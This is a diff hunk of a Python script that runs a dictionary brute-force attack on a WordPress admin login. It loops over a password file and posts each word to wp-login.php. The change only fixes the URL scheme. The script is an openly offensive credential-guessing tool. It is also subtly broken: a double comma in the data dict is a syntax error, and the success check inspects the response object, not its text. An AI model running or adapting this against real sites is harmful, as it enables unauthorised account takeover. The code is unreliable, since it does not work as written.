@@ -3,7 +3,7 @@ passwords = "your-password-dictionary-here.txt"
 with open(passwords, "r") as f:
     for word in f:
         word = word.strip("\n")
-        brute_ = requests.post("htt://localhost/wp-login.php", data={"log":"admin",,"pwd":word})
+        brute_ = requests.post("http://localhost/wp-login.php", data={"log":"admin",,"pwd":word})
 
         if "ERROR" not in brute_:
             print("Ayy, ya did it. Password was: " + word)
